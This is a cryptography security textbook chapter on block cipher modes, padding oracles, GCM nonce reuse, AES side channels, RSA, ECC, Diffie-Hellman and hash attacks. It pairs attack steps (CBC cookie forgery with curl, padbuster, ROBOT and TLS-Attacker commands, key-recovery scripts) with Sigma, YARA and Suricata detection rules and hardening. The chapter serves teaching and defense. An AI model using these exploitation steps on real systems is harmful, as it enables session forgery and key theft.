# Domain 13, Chapter 13A — Symmetric, Asymmetric, and Post-Quantum Cryptography

> **Scope.** Block cipher modes (ECB through SIV). CBC bit-flipping. Padding oracles (PKCS#7/Vaudenay). GCM nonce reuse (forbidden attack). ChaCha20-Poly1305. AES internals, key schedule, and AES-NI. Side-channel attacks on AES (cache timing, DPA, CPA, EM, DFA). RSA (Bleichenbacher, e=3 forgery, Hastad broadcast, Coppersmith, Wiener, Boneh-Durfee). ECC (Curve25519/Ed25519, NIST P-256, ECDSA nonce reuse, lattice attacks on biased nonces, invalid curve attacks, MOV attack). Diffie-Hellman (small subgroup attacks, Logjam, parameter validation). Hash functions (Merkle-Damgård, length extension, birthday bound, HMAC construction, SHA-1 collision/chosen-prefix, SHA-3/Keccak, BLAKE2/3). Password hashing (Argon2, scrypt, bcrypt, PBKDF2). Random number generator attacks (Dual_EC_DRBG, Debian CVE-2008-0166, Android SecureRandom, /dev/urandom). TLS protocol attacks (BEAST, CRIME, BREACH, POODLE, DROWN, ROBOT, Raccoon, renegotiation). Side-channel attacks (timing, cache FLUSH+RELOAD/PRIME+PROBE, SPA/DPA, Meltdown/Spectre). Implementation flaws (RNG failures, IV/key reuse, KRACK, downgrade/FREAK). Post-quantum (ML-KEM/Kyber, ML-DSA/Dilithium, SLH-DSA/SPHINCS+, Classic McEliece, Falcon, hybrid key exchange, harvest-now-decrypt-later, CNSA 2.0).
>
> **Prerequisites.** Domain 9 Chapter 9A §3 (TLS protocol mechanics). Domain 7 Chapter 7A §7 (cache side-channels). Domain 7 Chapter 7B §3.1 (power analysis).

---

## 1. Symmetric cryptography

### 1.1 Block cipher modes

**ECB (Electronic Codebook).** Each block encrypted independently with the same key. Identical plaintext blocks produce identical ciphertext blocks — the "ECB penguin" demonstrates that patterns in the plaintext are preserved in the ciphertext. ECB must never be used for data longer than one block.

**CBC (Cipher Block Chaining).** Each plaintext block is XORed with the previous ciphertext block before encryption. An IV (Initialization Vector) provides the XOR input for the first block. CBC provides semantic security (with random IV) but is not parallelizable for encryption and requires padding. CBC is vulnerable to bit-flipping (§1.2) and padding oracle attacks (§1.3).

**CTR (Counter).** A counter value is encrypted to produce a keystream; the keystream is XORed with the plaintext. CTR mode is parallelizable, requires no padding, and can seek to any position. The counter must never be reused with the same key (counter reuse = keystream reuse = XOR of two plaintexts).

**GCM (Galois/Counter Mode).** CTR mode for encryption plus GHASH (a universal hash based on multiplication in GF(2¹²⁸)) for authentication. GCM provides authenticated encryption (AEAD). The GHASH authentication tag depends on the authentication key (H = AES_K(0)), the ciphertext, and the associated data. GCM is the dominant AEAD mode in TLS 1.2 and 1.3. **GCM nonce reuse** is catastrophic: with two messages encrypted under the same nonce, the attacker can recover the authentication key H (via solving a polynomial equation over GF(2¹²⁸)) and forge authenticated messages. The key H is a fixed value derived from the encryption key — once recovered, all authentication is broken.

**CCM.** CBC-MAC for authentication + CTR for encryption. Used in WPA2 (AES-CCMP) and some IoT protocols. Less efficient than GCM (no parallelism in the authentication phase).

**XTS.** Tweakable block cipher mode for disk encryption. Each sector is encrypted with a tweak derived from the sector number and block index. Used by LUKS, BitLocker, and FileVault. XTS does not provide authentication — an attacker with write access to the disk can modify ciphertext blocks, causing targeted bit-flips in the decrypted plaintext (since XTS is a tweaked-ECB variant, each block decrypts independently).

**SIV (Synthetic Initialization Vector).** A deterministic AEAD mode: the IV is derived from the plaintext and associated data (via a PRF). SIV is nonce-misuse-resistant: reusing a nonce leaks only whether two messages are identical (no authentication-key recovery, no plaintext XOR). AES-GCM-SIV provides GCM-like performance with nonce-misuse resistance.

### 1.2 CBC bit-flipping

**Mechanism.** In CBC decryption, each ciphertext block is decrypted and XORed with the previous ciphertext block to produce the plaintext. If the attacker flips bit `i` in ciphertext block `C[n-1]`, the corresponding bit `i` in plaintext block `P[n]` is flipped (deterministically), while `P[n-1]` is randomized (the previous block decrypts to garbage).

**Exploitation.**

If the attacker knows the plaintext of block `P[n]` (or a portion of it), they can compute the XOR difference between the current value and the desired value, and apply that difference to `C[n-1]`. Example: changing `role=user` to `role=admin` in an encrypted cookie by flipping the appropriate bits in the preceding ciphertext block.

Step 1 — Capture the encrypted token (e.g., from Set-Cookie header):
```
# Extract encrypted cookie
curl -v https://target.com/login -d "user=test&pass=test" 2>&1 | grep Set-Cookie
# Cookie: session=<base64-encoded-CBC-ciphertext>
```

Step 2 — Decode and identify the target block position. Assuming 16-byte AES blocks:
```python
import base64
ct = base64.b64decode(cookie_value)
# Block 0 = IV, Block 1 = first data block, etc.
# If "role=user" starts at byte offset 16 in the plaintext:
# target_block = 1 (we modify block 0 to affect block 1)
```

Step 3 — Compute the XOR mask and apply:
```python
known_plaintext = b"role=user\x07\x07\x07\x07\x07\x07\x07"  # with PKCS7 padding
desired         = b"role=admin\x06\x06\x06\x06\x06\x06"
xor_mask = bytes(a ^ b for a, b in zip(known_plaintext, desired))
# Apply xor_mask to the preceding ciphertext block
modified_ct = bytearray(ct)
for i in range(16):
    modified_ct[i] ^= xor_mask[i]  # if IV is block 0
forged_cookie = base64.b64encode(bytes(modified_ct)).decode()
```

Step 4 — Send the forged cookie:
```
curl -b "session=${forged_cookie}" https://target.com/admin
```

**Detection.**

Sigma rule:
```yaml
title: CBC Bit-Flip Attempt — Decryption Error Followed by Modified Replay
logsource:
  product: webserver
  service: application
detection:
  selection_error:
    message|contains: "padding error"
  selection_success:
    status: 200
    uri|contains: "/admin"
  timeframe: 5m
  condition: selection_error | count() > 5 and selection_success
level: high
```

**Hardening.**

1. Use authenticated encryption (GCM, CCM, ChaCha20-Poly1305). Authentication detects any ciphertext modification.
2. If CBC must be used (legacy), apply encrypt-then-MAC: compute HMAC over the ciphertext and verify before decryption.
3. Bind the authentication tag to the session context (include session ID, user ID, or request counter in the MAC input).

### 1.3 Padding oracle attacks

**Mechanism.** PKCS#7 padding: the last byte(s) of the plaintext block indicate the padding length (e.g., `\x03\x03\x03` for 3 bytes of padding). On decryption, the server validates the padding. If the padding is invalid, the server returns an error (or a different HTTP status, or takes measurably different time).

The padding oracle: the attacker submits modified ciphertext blocks and observes whether the padding is valid or invalid. By systematically modifying bytes in the preceding ciphertext block and observing the padding oracle, the attacker can recover the decrypted plaintext byte-by-byte without knowing the key. This is the Vaudenay attack (2002), the same principle behind Lucky13 (Domain 9, Chapter 9A §3.4) and POODLE.

**Exploitation.**

Step 1 — Identify the oracle. Test with valid ciphertext (expect 200), then modify the last byte of the last ciphertext block (expect 500/error):
```
# padbuster — automated padding oracle exploitation
padbuster https://target.com/decrypt?data= <encrypted_sample> 16 \
  -encoding 0 -error "PaddingException"

# Alternative: padding-oracle-attacker (Python)
python3 padding_oracle.py --url "https://target.com/api" \
  --cookie "session=CIPHERTEXT" --block-size 16
```

Step 2 — Decrypt the ciphertext block-by-block:
```
# padbuster decrypt mode
padbuster https://target.com/decrypt?data= <encrypted_value> 16 \
  -encoding 0 -plaintext

# Output: recovered plaintext of the encrypted value
```

Step 3 — Forge a new ciphertext encrypting arbitrary plaintext:
```
# padbuster encrypt mode — create ciphertext for chosen plaintext
padbuster https://target.com/decrypt?data= <encrypted_value> 16 \
  -encoding 0 -plaintext "admin=true"
```

**Detection.**

| Source | Event / Signal | Key Fields |
|--------|---------------|------------|
| Web server log | Rapid 4xx/5xx responses to same endpoint | Source IP, request rate, parameter changes |
| WAF | Repeated requests with similar structure but varying last bytes | Request body diff pattern |
| Application log | Decryption/padding exceptions | Exception type, frequency per source |

Sigma rule:
```yaml
title: Padding Oracle Brute-Force — Rapid Decryption Error Responses
logsource:
  product: webserver
  category: access
detection:
  selection:
    status:
      - 500
      - 400
  filter_uri:
    uri|contains:
      - "decrypt"
      - "token"
      - "session"
  timeframe: 1m
  condition: selection and filter_uri | count(src_ip) > 50
level: critical
```

KQL:
```kql
AppServiceHTTPLogs
| where ScStatus in (400, 500)
| where CsUriStem has_any ("decrypt", "token", "session")
| summarize Attempts = count(), DistinctPayloads = dcount(CsUriQuery)
    by ClientIP = CIp, bin(TimeGenerated, 1m)
| where Attempts > 50
```

**Hardening.**

1. Use AEAD modes exclusively. Remove all CBC-mode cipher suites from TLS configuration:
```
# nginx — disable CBC suites
ssl_ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
```

2. If CBC is unavoidable: constant-time padding validation, encrypt-then-MAC, and rate-limit decryption requests.

3. Test for padding oracles:
```
# testssl.sh — check for CBC and padding oracle exposure
testssl --vulnerable --cipher-per-proto https://target.com

# Nmap script
nmap --script ssl-poodle -p 443 target.com
```

### 1.4 GCM nonce reuse exploitation

**Mechanism.** GCM uses a 96-bit nonce (IV). If the same nonce is used with the same key for two different messages, the attacker can:
1. XOR the two ciphertexts to obtain the XOR of the two plaintexts (since the keystream is identical).
2. Recover the GHASH authentication key H by solving a polynomial equation over GF(2¹²⁸).
3. Forge authentication tags for arbitrary messages.

**Exploitation.**

Given two ciphertext/tag pairs (C₁, T₁) and (C₂, T₂) encrypted under the same nonce:
```python
from Crypto.Cipher import AES
from gcm_crack import recover_auth_key  # using nonce-disrespecting-adversaries tool

# Step 1 — XOR ciphertexts to get plaintext XOR
plaintext_xor = bytes(a ^ b for a, b in zip(c1, c2))

# Step 2 — Recover GHASH key H
H = recover_auth_key(c1, t1, c2, t2, nonce)

# Step 3 — Forge tag for arbitrary ciphertext
forged_tag = compute_ghash(H, forged_ciphertext, aad, nonce)
```

Tool: `nonce-disrespect` (GitHub: nonce-disrespecting-adversaries) automates GHASH key recovery from nonce-reusing GCM implementations.

**Detection.**

Monitor for duplicate nonces in TLS records (requires packet-level inspection):
```
# Zeek script — detect GCM nonce reuse
event ssl_encrypted_data(c: connection, is_orig: bool, content_type: count,
                          length: count) {
    # Extract and track nonces from TLS record layer
    # Alert if same nonce seen twice for same session
}
```

Suricata rule (detecting known nonce-reuse CVEs):
```
alert tls any any -> any any (msg:"TLS GCM Nonce Reuse Detected"; \
  flow:established; content:"|17 03 03|"; \
  detection_filter:track by_src, count 2, seconds 1; \
  sid:1013001; rev:1;)
```

**Hardening.**

1. Use TLS 1.3 exclusively (enforces unique-per-record nonces via XOR of a sequence number with the IV).
2. For application-layer GCM: use a counter-based nonce (never random nonces when message volume is high — birthday bound for 96-bit nonce is 2³² messages ≈ 4 billion, but safety margin requires staying well below this).
3. Consider AES-GCM-SIV for nonce-misuse resistance.

### 1.5 ChaCha20-Poly1305

An AEAD construction: ChaCha20 (a stream cipher by Bernstein, using 256-bit key, 96-bit nonce, 32-bit counter; 20 rounds of quarter-round operations on a 4×4 matrix of 32-bit words) for encryption, and Poly1305 (a one-time authenticator: computes a polynomial evaluation modulo 2¹³⁰-5) for authentication.

ChaCha20-Poly1305 is the primary alternative to AES-GCM in TLS 1.3. Advantages: constant-time in software (no lookup tables, immune to cache-timing attacks), faster than AES-GCM on CPUs without AES-NI (mobile ARM processors), and simple to implement correctly.

**Testing cipher support:**
```
# openssl — test ChaCha20 availability
openssl speed -evp chacha20-poly1305
openssl speed -evp aes-256-gcm

# Compare performance on target hardware
openssl speed -evp chacha20-poly1305 -evp aes-128-gcm -evp aes-256-gcm

# Check if server supports ChaCha20-Poly1305
openssl s_client -connect target.com:443 -cipher ECDHE-ECDSA-CHACHA20-POLY1305

# testssl.sh — check cipher order preference
testssl --cipher-per-proto https://target.com
```

**Recommended cipher order (server-side, prefer ChaCha20 for mobile clients):**
```
# nginx — prefer ChaCha20 for clients without AES-NI
ssl_ciphers 'TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256';
ssl_prefer_server_ciphers on;
```

### 1.6 AES internals and side channels

AES operates on a 4×4 byte matrix (the "state"). Each round applies: **SubBytes** (byte substitution via the S-box — a nonlinear transformation), **ShiftRows** (cyclic shift of rows), **MixColumns** (column-wise matrix multiplication over GF(2⁸)), and **AddRoundKey** (XOR with the round key). 10 rounds for AES-128, 12 for AES-192, 14 for AES-256.

**AES key schedule weaknesses.** The round keys are derived from the master key via RotWord, SubWord (S-box per byte), and XOR with round constants (Rcon). AES-256 has a known related-key attack (Biryukov and Khovratovich, 2009): related-key distinguishers in 2^99.5 time. Not practical for single-key security, but demonstrates that AES-256's key schedule is weaker relative to its key size than AES-128's. The AES-256 key schedule's linearity allows related-key boomerang attacks — this matters for protocols that derive multiple AES keys from related inputs without proper key derivation (HKDF). For single-key usage with proper KDFs, AES-256 remains secure.

**AES-NI**: Intel/AMD instruction set extensions (`AESENC`, `AESDEC`, `AESKEYGENASSIST`, etc.) that perform entire AES rounds in hardware, eliminating software lookup tables and providing constant-time execution. **VAES**: vectorized AES (AVX-512), processing multiple blocks in parallel.

**Cache-timing attacks.** Software AES implementations use T-tables (precomputed lookup tables for the combined SubBytes+ShiftRows+MixColumns operation). The index into the T-table depends on the key and plaintext. An attacker who can observe cache access patterns (via FLUSH+RELOAD or PRIME+PROBE, Domain 7 Chapter 7A §7) can infer the T-table indices and recover the key. Bernstein's 2005 attack demonstrated remote key recovery via network timing. Defense: AES-NI (no tables) or bit-sliced AES (constant-time software implementation).

**Practical cache-timing exploitation:**
```
# Flush+Reload on AES T-tables (using Mastik toolkit)
# Step 1 — identify T-table addresses in target binary
objdump -t /usr/lib/libcrypto.so | grep Te0
# Te0, Te1, Te2, Te3 are the four T-tables

# Step 2 — run FR-trace with spy process
./FR-trace -s target_process -a 0x<Te0_address> -o trace.bin

# Step 3 — analyze traces to recover key bytes
python3 analyze_traces.py trace.bin --known-plaintext <hex>
```

**Power analysis (DPA/CPA).** Measuring the CPU's power consumption during AES rounds reveals data-dependent variations. DPA (Differential Power Analysis) uses statistical correlation between power traces and hypothetical intermediate values to recover key bytes. CPA (Correlation Power Analysis) is a refined variant. Relevant for smartcard/embedded implementations; Domain 7 Chapter 7B §3.1 (PLATYPUS) showed software-accessible power analysis via RAPL.

**DPA tooling:**
```
# ChipWhisperer — open-source power analysis platform
# Step 1 — capture power traces during AES encryption
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope)
traces = []
for i in range(5000):
    plaintext = os.urandom(16)
    scope.arm()
    target.simpleserial_write('p', plaintext)
    ret = scope.capture()
    traces.append(scope.get_last_trace())

# Step 2 — CPA attack on first round SubBytes output
import chipwhisperer.analyzer as cwa
attack = cwa.cpa(traces, plaintexts)
results = attack.run()  # recovers AES key bytes
```

**Differential Fault Analysis (DFA).** Inducing a single-byte fault in the second-to-last AES round (via voltage glitching, clock glitching, or laser) produces a faulty ciphertext. Comparing the faulty and correct ciphertexts reveals the last-round key (from which the full key is derived via the key schedule). Domain 7 Chapter 7B §1.3 (Plundervolt) demonstrated DFA on SGX-protected AES.

**DFA tooling:**
```
# phoenixAES — DFA key recovery from faulty ciphertexts
# Requires pairs of (correct_ciphertext, faulty_ciphertext)
from phoenixAES import crack_bytes
key_bytes = crack_bytes(
    correct_ciphertexts=["AABBCCDD..."],
    faulty_ciphertexts=["AABB00DD..."]  # fault in round 9
)
```

**Detection of weak AES usage.**

YARA rule:
```yara
rule Weak_AES_ECB_Usage {
    meta:
        description = "Detects hardcoded AES ECB mode usage in binaries"
        severity = "high"
    strings:
        $ecb_openssl = "EVP_aes_256_ecb" ascii
        $ecb_openssl2 = "EVP_aes_128_ecb" ascii
        $ecb_java = "AES/ECB/" ascii
        $ecb_dotnet = "CipherMode.ECB" ascii
        $ecb_python = "MODE_ECB" ascii
    condition:
        any of them
}
```

**Hardening — verify AES-NI availability and enforce AEAD:**
```bash
# Check AES-NI support
grep -o aes /proc/cpuinfo | head -1
# Output: "aes" if AES-NI is available

# OpenSSL — verify AES-NI is being used (not T-tables)
openssl speed -evp aes-256-gcm 2>&1 | head -5
# Should show hardware-accelerated speed

# Disable non-AEAD cipher suites system-wide (RHEL/Fedora)
update-crypto-policies --set FUTURE
# FUTURE policy disables CBC, RC4, 3DES, SHA-1
```

---

## 2. Asymmetric cryptography

### 2.1 RSA attacks

**Bleichenbacher's attack on PKCS#1 v1.5.**

**Mechanism.** The server's response to a decryption request differs depending on whether the plaintext has valid PKCS#1 v1.5 padding. The attacker submits adaptively-chosen ciphertexts and uses the padding oracle to narrow down the plaintext range, recovering the entire message after roughly 2²⁰ queries. This attack has been rediscovered in production systems repeatedly — ROBOT (2017) showed major TLS implementations still vulnerable 19 years later.

**Exploitation.**

```
# ROBOT scanner — test for Bleichenbacher oracle
python3 robot-detect.py -len 48 target.com:443

# TLS-Attacker — comprehensive Bleichenbacher test
java -jar TLS-Attacker.jar -connect target.com:443 \
  -workflow_type BLEICHENBACHER

# Manual test with openssl (check for timing differences)
# Send valid vs invalid PKCS#1 v1.5 and measure response time
for i in $(seq 1 100); do
  time openssl s_client -connect target.com:443 -cipher kRSA < /dev/null 2>&1
done
```

**Detection.**

Sigma rule:
```yaml
title: ROBOT / Bleichenbacher Oracle — Excessive RSA Key Exchange Attempts
logsource:
  product: webserver
  service: tls
detection:
  selection:
    cipher_suite|contains: "RSA"
    handshake_failure: true
  timeframe: 5m
  condition: selection | count(src_ip) > 20
level: high
```

**Hardening.**
```
# Disable RSA key exchange entirely (nginx)
ssl_ciphers '!kRSA:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';

# Apache
SSLCipherSuite !kRSA:ECDHE-ECDSA-AES256-GCM-SHA384

# TLS 1.3 eliminates RSA key exchange entirely — enforce TLS 1.3 minimum
ssl_protocols TLSv1.3;
```

**e=3 signature forgery.** With small public exponent (e=3) and PKCS#1 v1.5 signature padding, if the verifier doesn't check the padding fully (doesn't verify that the padding extends to the expected length), an attacker can compute a cube root of a crafted value that has valid padding in its most significant bytes, forging a signature.

**Exploitation (Hal Finney attack on RSA e=3):**
```python
# Forge RSA signature with e=3 and lax PKCS#1 v1.5 verification
import gmpy2

# Target: PKCS#1 v1.5 encoded hash
# 00 01 FF...FF 00 <DigestInfo><Hash>
# With lax verification, trailing bytes are ignored
prefix = b'\x00\x01\xff\x00' + asn1_sha256_prefix + target_hash
# Pad to key length with garbage
crafted = int.from_bytes(prefix + b'\x00' * (key_len - len(prefix)), 'big')
# Compute cube root
forged_sig = int(gmpy2.iroot(crafted, 3)[0]) + 1
```

**Coppersmith's method.** Uses lattice reduction (LLL algorithm) to find small roots of polynomials modulo N. Applications: recovering plaintext when a large fraction is known (stereotyped messages), factoring N when part of a prime factor is known, and breaking RSA with short padding.

```python
# SageMath — Coppersmith small_roots()
# Example: recover remaining plaintext bytes when prefix is known
N = ...  # RSA modulus
e = 3
known_prefix = b"The secret is: "
# m = known_prefix || unknown (unknown < 2^40)
P.<x> = PolynomialRing(Zmod(N))
f = (bytes_to_long(known_prefix) * 2^40 + x)^e - c
roots = f.small_roots(X=2^40, beta=1.0)
```

**Hastad broadcast attack.** If the same plaintext m is encrypted with e=3 under three different RSA public keys (N1, N2, N3), producing c1 = m^3 mod N1, c2 = m^3 mod N2, c3 = m^3 mod N3, the attacker uses CRT to compute m^3 mod (N1*N2*N3). Since m < min(Ni), m^3 < N1*N2*N3, so the CRT result equals m^3 over the integers. The attacker computes the integer cube root to recover m.

```python
# SageMath — Hastad broadcast attack (e=3, 3 recipients)
from sympy.ntheory.modular import crt
import gmpy2

c = [c1, c2, c3]  # three ciphertexts
n = [n1, n2, n3]  # three moduli

# Chinese Remainder Theorem
m_cubed, _ = crt(n, c)
m, exact = gmpy2.iroot(m_cubed, 3)
assert exact, "Cube root was not exact — padding may be in use"
plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big')
```

**Hardening.** Use OAEP padding (randomized padding makes each ciphertext encrypt a different padded value). Use e=65537 (standard public exponent).

**Wiener's attack.** Recovers d when d is small (d < N^(1/4) / 3) by computing the continued-fraction expansion of e/N. **Boneh-Durfee** extends this to d < N^0.292 using the LLL algorithm on a carefully constructed lattice.

```python
# RsaCtfTool — automated RSA attack toolkit
python3 RsaCtfTool.py --publickey pub.pem --attack wiener
python3 RsaCtfTool.py --publickey pub.pem --attack boneh_durfee
python3 RsaCtfTool.py --publickey pub.pem --attack smallq  # Fermat factoring
python3 RsaCtfTool.py --publickey pub.pem --attack pastctfprimes  # known weak primes
```

**RSA key strength testing:**
```
# OpenSSL — check RSA key size and parameters
openssl rsa -in key.pem -text -noout | head -3
# RSA key should be >= 2048 bits (3072+ recommended, 4096 for longevity)

# factordb — check if modulus is a known factorable key
openssl rsa -in pub.pem -pubin -modulus -noout
# Submit the modulus to factordb.com or use:
python3 -c "from factordb.factordb import FactorDB; f=FactorDB(N); f.connect(); print(f.get_factor_list())"

# Check for shared factors across certificates (batch GCD)
# Use the fastgcd tool to find common factors among collected RSA moduli
./fastgcd moduli.hex
```

### 2.2 Elliptic curve cryptography

**ECDSA nonce reuse.**

**Mechanism.** If the same nonce k is used for two different messages, the attacker can compute k (and thus the private key) from the two signatures: given (r, s₁) and (r, s₂) for messages m₁ and m₂, k = (m₁ - m₂) / (s₁ - s₂) mod n. The PlayStation 3 ECDSA key was recovered this way (Sony used a constant k). Even partial nonce bias (a few bits of k leaked via side channels) is sufficient for key recovery via lattice attacks — the LadderLeak and Minerva attacks demonstrated this.

**Exploitation:**
```python
# ECDSA nonce reuse — private key recovery
from ecdsa import SECP256k1
import hashlib

n = SECP256k1.order
# Two signatures with same r value (same nonce)
r = 0x...   # same r in both signatures
s1 = 0x...  # first signature s component
s2 = 0x...  # second signature s component
z1 = int(hashlib.sha256(msg1).hexdigest(), 16)  # hash of first message
z2 = int(hashlib.sha256(msg2).hexdigest(), 16)  # hash of second message

# Recover nonce k
k = ((z1 - z2) * pow(s1 - s2, -1, n)) % n
# Recover private key d
d = ((s1 * k - z1) * pow(r, -1, n)) % n
```

**Lattice attack on biased nonces (partial nonce exposure):**
```python
# SageMath — lattice attack when MSBs of nonce are known
# Requires ~100 signatures with ~4 bits of nonce leaked per signature
from sage.all import *

# Construct the Hidden Number Problem (HNP) lattice
# B = [[n, 0, ..., 0, 0],
#       [0, n, ..., 0, 0],
#       ...
#       [t1, t2,..., B/n, 0],
#       [a1, a2,..., 0, B]]
# where ti = ri^(-1) * si mod n, ai = ri^(-1) * zi mod n
# LLL-reduce the lattice to recover the private key
```

**Invalid curve attacks.**

**Mechanism.** The attacker sends a point that is not on the expected curve but on a different curve with a small subgroup. If the implementation doesn't validate that the received point is on the correct curve, scalar multiplication produces a result on the weak curve. The attacker can recover the private scalar modulo the small-subgroup order. Repeating with different weak curves (chosen to have coprime subgroup orders) and applying CRT (Chinese Remainder Theorem) recovers the full scalar.

**Testing for invalid curve vulnerability:**
```
# ecdhtest — test TLS ECDH implementations for invalid curve acceptance
python3 ecdhtest.py target.com:443

# TLS-Attacker — invalid curve attack
java -jar TLS-Attacker.jar -connect target.com:443 \
  -workflow_type INVALID_CURVE
```

**Curve25519 vs P-256.** Curve25519 (Montgomery form, used for ECDH as X25519) and Ed25519 (twisted Edwards form, used for signatures) were designed with "nothing up my sleeve" parameters (derived from small constants, not unexplained constants like NIST curves' seed values). They are complete (addition formulas work for all point pairs without special cases), enabling constant-time implementations. P-256's parameters were generated from a SHA-1 hash of a seed whose origin was not explained, leading to persistent (though unsubstantiated) concerns about backdoors.

**Hardening — enforce strong curves:**
```
# OpenSSL — check supported curves
openssl ecparam -list_curves

# nginx — specify curves (prefer X25519)
ssl_ecdh_curve X25519:secp384r1:secp256r1;

# SSH — enforce Ed25519 keys only
# /etc/ssh/sshd_config
HostKeyAlgorithms ssh-ed25519
PubkeyAcceptedAlgorithms ssh-ed25519

# Generate Ed25519 key
ssh-keygen -t ed25519 -a 100
```

### 2.3 Diffie-Hellman attacks

**Small subgroup attacks.**

**Mechanism.** In DH over Z_p*, the group order is p-1. If p-1 has small prime factors r1, r2, ..., an attacker can send group elements of small order. If the implementation doesn't validate that the received element is in the prime-order subgroup (order q, where p = 2q + 1 for safe primes), the attacker recovers the private exponent modulo each small factor. The attacker sends g' where g'^r = 1 (mod p) for small r. The victim computes (g')^x mod p = (g')^(x mod r) mod p. Since r is small, the attacker brute-forces x mod r. Repeating with elements of coprime small orders and applying CRT yields x mod (r1 * r2 * ...).

**Exploitation.**
```python
# SageMath — small subgroup attack on DH with unsafe prime
p = ...   # prime where p-1 has small factors
g = ...   # generator
# Find small prime factor r of p-1
factors = factor(p - 1)
for r, _ in factors:
    if r < 2^20:
        # Construct element of order r
        h = power_mod(g, (p - 1) // r, p)
        # h has order r in Z_p*
        # Send h to victim, observe victim's response y = h^x mod p
        # Brute-force: find x_r such that h^x_r = y (mod p)
        for x_r in range(r):
            if power_mod(h, x_r, p) == y:
                print(f"x mod {r} = {x_r}")
                break
# Apply CRT to recover x mod (product of small factors)
```

**Hardening.** (1) Use safe primes (p = 2q + 1 where q is prime) — the only subgroups have orders 1, 2, q, 2q. (2) Validate received elements: check 1 < g' < p-1 and g'^q = 1 mod p. (3) Use RFC 7919 named groups (ffdhe2048, ffdhe3072, ffdhe4096). (4) Prefer ECDH (X25519, P-256) where subgroup validation is simpler.

---

**Logjam (CVE-2015-4000).**

**Mechanism.** TLS servers supporting DHE_EXPORT cipher suites could be downgraded to 512-bit DH. The Number Field Sieve (NFS) precomputation for a specific 512-bit prime allows individual discrete logarithm computations in about 90 seconds. Many servers used the same 512-bit or 1024-bit primes, so precomputation could be amortized across all of them. Adrian et al. (2015) estimated that a well-funded adversary could perform NFS precomputation for the most common 1024-bit DH prime, enabling passive decryption of VPN/TLS traffic.

**Exploitation.**
```bash
# Test for Logjam vulnerability
nmap --script ssl-dh-params -p 443 target.com
# Reports DH parameter size and whether common/weak primes are used

# testssl.sh — check DH parameters
testssl.sh --logjam target.com:443

# OpenSSL — inspect DH parameter size during handshake
openssl s_client -connect target.com:443 -cipher DHE-RSA-AES128-SHA \
  2>/dev/null | grep "Server Temp Key"
# "DH, 1024 bits" = vulnerable; "DH, 2048 bits" = acceptable minimum
```

**Hardening.** (1) Minimum 2048-bit DH groups; prefer 3072-bit or 4096-bit. (2) Use RFC 7919 named groups (ffdhe2048, ffdhe3072). (3) Disable DHE_EXPORT cipher suites. (4) Prefer ECDHE over DHE. (5) TLS 1.3 only allows ffdhe groups >= 2048 bits.

```bash
# Generate custom DH parameters (2048-bit minimum)
openssl dhparam -out dhparams.pem 4096
# nginx configuration
ssl_dhparam /etc/nginx/dhparams.pem;
ssl_ecdh_curve X25519:secp384r1:secp256r1;
```

### 2.4 Hash functions

**Length extension on Merkle-Damgård.**

**Mechanism.** SHA-256, SHA-512, and MD5 use the Merkle-Damgård construction: the hash state after processing message M is the final hash H(M). An attacker who knows H(M) (but not M) can compute H(M || padding || suffix) without knowing M — the attacker initializes the hash with H(M) as the state and continues hashing the suffix. This breaks constructions that compute `H(secret || message)`.

**Exploitation:**
```
# HashPump — length extension attack tool
hashpump -s <original_hash> -d <original_data> -a <data_to_append> -k <secret_length>
# Output: new hash and extended data string

# hash_extender — alternative tool
./hash_extender --data "data" --secret-length 16 --append "admin=true" \
  --signature <original_mac> --format sha256
```

**Defense:** HMAC, SHA-3/Keccak (sponge construction, immune to length extension), or BLAKE2 (keyed mode).

**HMAC construction internals.** HMAC(K, m) = H((K XOR opad) || H((K XOR ipad) || m)), where ipad = 0x36 repeated to block size, opad = 0x5C repeated to block size. If K is longer than the hash block size, K is first hashed: K' = H(K). The inner hash H((K XOR ipad) || m) produces an intermediate digest. The outer hash H((K XOR opad) || intermediate) creates a new Merkle-Damgard chain with a key-dependent IV, making it impossible for an attacker to extend without knowing K. Security proof (Bellare, Canetti, Krawczyk, 1996): HMAC is a PRF if the compression function is a PRF. This is why HMAC-MD5 remains secure even though MD5's collision resistance is broken — HMAC security depends on the compression function's PRF properties, not collision resistance.

**Birthday bound and collision resistance.** A hash function with n-bit output has 2^n possible values. By the birthday paradox, a collision is expected after approximately sqrt(2^n) = 2^(n/2) evaluations. For SHA-256 (n=256): collision resistance = 2^128 operations. For SHA-1 (n=160): theoretical collision resistance = 2^80, actual (after Stevens et al.) = ~2^63.1. For MD5 (n=128): theoretical = 2^64, actual: seconds on modern hardware.

**Implications for protocol design:** (1) HMAC tags should be at least 128 bits (birthday bound = 2^64). (2) Digital signatures: collision resistance is critical — an attacker finding collisions creates two documents with the same hash, gets one signed, substitutes the other. (3) Certificate forgery: MD5 collisions enabled rogue CA certificate creation (Sotirov et al., 2008, using chosen-prefix collisions). (4) Random nonce/IV birthday bounds: a 96-bit GCM nonce has birthday bound ~2^48, but NIST recommends limiting to 2^32 invocations per key for safety margin.

**SHA-1 SHAttered.** The first practical SHA-1 collision (Google/CWI, 2017): two different PDF files with the same SHA-1 hash. Required approximately 2^63.1 SHA-1 evaluations (~6,500 years of single-CPU computation, performed with GPUs). SHA-1 is deprecated for all security-sensitive uses. Leurent and Peyrin (2020) extended this to chosen-prefix collisions in 2^63.4 work, enabling PGP key impersonation. SHA-1 remains in git for commit hashing (git is migrating to SHA-256).

**SHA-3 / Keccak.** A sponge construction: the internal state (1600 bits = 5x5 matrix of 64-bit words) absorbs input blocks (rate r bits at a time) and squeezes output blocks. SHA-3-256 uses rate r=1088, capacity c=512. The capacity c determines security: collision resistance = c/2, preimage resistance = min(output_len, c). SHA-3 is not vulnerable to length extension because the capacity portion of the state (c bits) is never directly output — the attacker cannot reconstruct the full 1600-bit state from the output to continue hashing.

**BLAKE2 and BLAKE3.** BLAKE2 (RFC 7693) is a fast hash function based on ChaCha, supporting keyed mode (built-in MAC without HMAC wrapper) and personalization. BLAKE3 uses a Merkle tree construction for parallelism and is immune to length extension by design.

**Practical hash identification and cracking:**

